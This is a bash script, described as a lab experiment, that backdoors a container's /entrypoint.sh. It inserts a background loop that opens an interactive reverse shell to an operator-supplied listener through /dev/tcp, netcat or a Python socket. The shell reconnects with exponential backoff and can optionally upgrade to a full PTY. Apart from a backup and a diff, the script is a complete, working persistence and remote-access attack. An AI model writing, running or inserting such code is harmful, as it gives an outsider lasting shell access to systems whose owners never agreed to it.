#!/bin/bash
# ==============================================================================
# inject-reverse-shell.sh
# Injects a non-blocking reverse shell call into /entrypoint.sh.
#
# Lab experiment  this script is intentionally TRANSPARENT and VERBOSE.
# It does NOT contain any behaviour for trace removal or for operating silently.
# ==============================================================================
#
# USAGE
#   chmod +x inject-reverse-shell.sh
#   ./inject-reverse-shell.sh <LISTENER_IP> <LISTENER_PORT> [--pty]
#
#   Without --pty: injects a basic reverse shell (bash -i via /dev/tcp)
#   With    --pty: injects the full PTY upgrade chain from reverse-shell.sh
#
# EXAMPLE
#   ./inject-reverse-shell.sh 10.0.0.42 4444
#   ./inject-reverse-shell.sh 10.0.0.42 4444 --pty
#
# WHAT THIS SCRIPT DOES
#   1. Backs up /entrypoint.sh to /entrypoint.sh.bak.YYYYMMDD-HHMMSS
#   2. Inserts a non-blocking reverse shell call early in /entrypoint.sh
#      (right after the shebang and set -e, before the main payload)
#   3. The injected snippet runs in a background subshell so it does not
#      block or interfere with the existing entrypoint logic
#   4. Shows a diff between the original and the modified file
# ==============================================================================

set -euo pipefail

# ---- Usage ------------------------------------------------------------------
usage() {
    echo "Usage: $(basename "$0") LISTENER_IP LISTENER_PORT [--pty]"
    echo ""
    echo "  LISTENER_IP     IP or hostname of your netcat listener"
    echo "  LISTENER_PORT   port the listener is bound to"
    echo "  --pty           include PTY upgrade in the injected payload"
    echo ""
    echo "Example:"
    echo "  $(basename "$0") 10.0.0.42 4444"
    echo "  $(basename "$0") 10.0.0.42 4444 --pty"
    exit 1
}

[ $# -lt 2 ] && usage

LISTENER_IP="$1"
LISTENER_PORT="$2"
USE_PTY=false

if [ $# -ge 3 ]; then
    case "$3" in
        --pty) USE_PTY=true ;;
        *)     usage ;;
    esac
fi

ENTRYPOINT="/entrypoint.sh"

if [ ! -f "$ENTRYPOINT" ]; then
    echo "[FATAL] ${ENTRYPOINT} does not exist."
    exit 1
fi

if [ ! -w "$ENTRYPOINT" ]; then
    echo "[FATAL] ${ENTRYPOINT} is not writable."
    exit 1
fi

echo ""
echo "============================================"
echo " Inject Reverse Shell  $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "============================================"
echo ""
echo "  Target file : ${ENTRYPOINT}"
echo "  Listener    : ${LISTENER_IP}:${LISTENER_PORT}"
echo "  PTY mode    : ${USE_PTY}"
echo "  Host        : $(uname -a)"
echo "  User        : $(id)"
echo ""

# ---- Validate IP -----------------------------------------------------------
if ! echo "$LISTENER_IP" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'; then
    echo "[WARNING] '${LISTENER_IP}' doesn't look like an IPv4 address."
fi

# ---- Validate listener reachable -------------------------------------------
echo "[*] Checking listener reachability..."
if command -v bash &> /dev/null; then
    if timeout 3 bash -c "echo > /dev/tcp/${LISTENER_IP}/${LISTENER_PORT}" 2>/dev/null; then
        echo "[*] Listener is reachable on ${LISTENER_IP}:${LISTENER_PORT}."
    else
        echo "[WARNING] Cannot reach listener. Continuing anyway  it may come up later."
    fi
fi

# ---- Backup the original ---------------------------------------------------
BACKUP="${ENTRYPOINT}.bak.$(date +'%Y%m%d-%H%M%S')"
cp "$ENTRYPOINT" "$BACKUP"
echo "[*] Original backed up to: ${BACKUP}"

# ---- Build the injection payload -------------------------------------------
#
# The payload:
#   - Runs in a background subshell (  ) &   so it's non-blocking
#   - Has a short initial sleep to let the container/service settle
#   - Loops forever, reconnecting on disconnect with exponential backoff
#   - Is inserted after the shebang + set -e but before any substantive logic
#

if $USE_PTY; then

INJECTION=$(cat <<INJECT_EOF

# ---- injected reverse shell (pty) ----
(
    LHOST="${LISTENER_IP}"
    LPORT="${LISTENER_PORT}"
    sleep 3

    # Payload: full PTY upgrade chain
    PAYLOAD='
echo "[reverse-shell] Connected  \$(date)"

# --- Attempt 1: python3 fork PTY ---
if command -v python3 &>/dev/null; then
    python3 -c "
import pty, os, sys, signal, termios
try:
    pid, fd = pty.fork()
    if pid == 0:
        os.putenv('"'"'TERM'"'"', os.environ.get('"'"'TERM'"'"', '"'"'xterm-256color'"'"'))
        os.putenv('"'"'SHELL'"'"', '"'"'/bin/bash'"'"')
        os.execlp('"'"'bash'"'"', '"'"'bash'"'"', '"'"'-i'"'"')
    else:
        def resize(signum, frame):
            try:
                s = termios.tcgetwinsize(sys.stdin.fileno())
                termios.tcsetwinsize(fd, s)
            except Exception:
                pass
        signal.signal(signal.SIGWINCH, resize)
        resize(0, None)
        while True:
            try:
                data = os.read(sys.stdin.fileno(), 4096)
                if not data: break
                while data:
                    n = os.write(fd, data)
                    data = data[n:]
            except OSError:
                break
            try:
                data = os.read(fd, 4096)
                if not data: break
                while data:
                    n = os.write(sys.stdout.fileno(), data)
                    data = data[n:]
            except OSError:
                break
        os.waitpid(pid, 0)
except Exception:
    pass
"
    [ \$? -ne 0 ] || exit 0
fi

# --- Attempt 2: python3 pty.spawn ---
if command -v python3 &>/dev/null; then
    python3 -c "import pty; pty.spawn('"'"'/bin/bash'"'"')"
    [ \$? -ne 0 ] || exit 0
fi

# --- Attempt 3: script ---
if command -v script &>/dev/null; then
    TERM="\${TERM:-xterm-256color}" SHELL=/bin/bash script -qc /bin/bash /dev/null
    exit \$?
fi

# --- Fallback: bare bash ---
/bin/bash -i
'

    BACKOFF=1
    MAX_BACKOFF=60
    while true; do
        if command -v bash &>/dev/null && [ -c /dev/tcp ]; then
            bash -c "\$PAYLOAD" 0<>/dev/tcp/"\$LHOST"/"\$LPORT" 1>&0 2>&0
        elif command -v nc &>/dev/null; then
            bash -c "\$PAYLOAD" < <(nc "\$LHOST" "\$LPORT") > >(nc "\$LHOST" "\$LPORT") 2>&1
        elif command -v python3 &>/dev/null; then
            python3 -c "
import socket,subprocess,time
while True:
    try:
        s=socket.create_connection(('"\$LHOST"',"\$LPORT"),timeout=10)
        subprocess.call(['"'"'/bin/bash'"'"','"'"'-i'"'"'],stdin=s,stdout=s,stderr=s)
        s.close()
    except Exception:
        pass
    time.sleep(\$BACKOFF)
    BACKOFF=min(\$BACKOFF*2,\$MAX_BACKOFF)
"
            exit 0
        fi
        sleep "\$BACKOFF"
        if [ "\$BACKOFF" -lt "\$MAX_BACKOFF" ]; then
            BACKOFF=\$((BACKOFF * 2))
        fi
    done
) &
# ---- end injected reverse shell ----

INJECT_EOF
)

else

INJECTION=$(cat <<INJECT_EOF

# ---- injected reverse shell ----
(
    LHOST="${LISTENER_IP}"
    LPORT="${LISTENER_PORT}"
    sleep 3
    BACKOFF=1
    MAX_BACKOFF=60
    while true; do
        if command -v bash &>/dev/null && [ -c /dev/tcp ]; then
            /bin/bash -i >&/dev/tcp/"\${LHOST}"/"\${LPORT}" 0>&1
        elif command -v nc &>/dev/null; then
            nc "\$LHOST" "\$LPORT" -e /bin/bash
        elif command -v python3 &>/dev/null; then
            python3 -c "
import socket,subprocess,time
while True:
    try:
        s=socket.create_connection(('\$LHOST',\$LPORT),timeout=10)
        subprocess.call(['/bin/bash','-i'],stdin=s,stdout=s,stderr=s)
        s.close()
    except Exception:
        pass
    time.sleep(\$BACKOFF)
    BACKOFF=min(\$BACKOFF*2,\$MAX_BACKOFF)
"
            exit 0
        fi
        sleep "\$BACKOFF"
        if [ "\$BACKOFF" -lt "\$MAX_BACKOFF" ]; then
            BACKOFF=\$((BACKOFF * 2))
        fi
    done
) &
# ---- end injected reverse shell ----

INJECT_EOF
)

fi

# ---- Perform the injection -------------------------------------------------
#
# Strategy: insert right after the "set -e" line (or shebang if no set -e).
# We look for a line matching exactly "^set -e" or "^set -eu" and insert
# the payload after it. If there's no set line, we insert after the shebang.
#

echo "[*] Injecting reverse shell payload into ${ENTRYPOINT}..."

INSERT_AFTER="set -e"
FOUND=$(grep -n "^${INSERT_AFTER}\$" "$ENTRYPOINT" | head -1 | cut -d: -f1 || true)

if [ -z "$FOUND" ]; then
    INSERT_AFTER="set -eu"
    FOUND=$(grep -n "^${INSERT_AFTER}\$" "$ENTRYPOINT" | head -1 | cut -d: -f1 || true)
fi

if [ -z "$FOUND" ]; then
    INSERT_AFTER="set -euo pipefail"
    FOUND=$(grep -n "^${INSERT_AFTER}\$" "$ENTRYPOINT" | head -1 | cut -d: -f1 || true)
fi

if [ -z "$FOUND" ]; then
    # No set line found  insert after the shebang (first line)
    INSERT_AFTER='#!/bin/bash'
    FOUND=$(grep -n "^${INSERT_AFTER}" "$ENTRYPOINT" | head -1 | cut -d: -f1 || true)
fi

if [ -z "$FOUND" ]; then
    echo "[FATAL] Cannot find a 'set -e' line or shebang in ${ENTRYPOINT}."
    echo "        Injection requires a known insertion point."
    exit 1
fi

echo "[*] Inserting after line ${FOUND}: ${INSERT_AFTER}"

# Split the file at the insertion point and reassemble
head -n "$FOUND" "$ENTRYPOINT" > "${ENTRYPOINT}.new"
echo "$INJECTION" >> "${ENTRYPOINT}.new"
tail -n +$((FOUND + 1)) "$ENTRYPOINT" >> "${ENTRYPOINT}.new"

# Replace in place
mv "${ENTRYPOINT}.new" "$ENTRYPOINT"
chmod --reference="$BACKUP" "$ENTRYPOINT"

echo "[*] Injection complete."
echo ""

# ---- Show what changed -----------------------------------------------------
echo "============================================"
echo "  DIFF  original vs injected"
echo "============================================"
diff "$BACKUP" "$ENTRYPOINT" || true
echo "============================================"
echo ""
echo "  Original : ${BACKUP}"
echo "  Injected : ${ENTRYPOINT}"
echo ""
echo "  To revert: cp ${BACKUP} ${ENTRYPOINT}"
echo ""
echo "  The injected shell connects to ${LISTENER_IP}:${LISTENER_PORT}"
echo "  and keeps reconnecting every 1s60s if the listener drops."
echo "============================================"
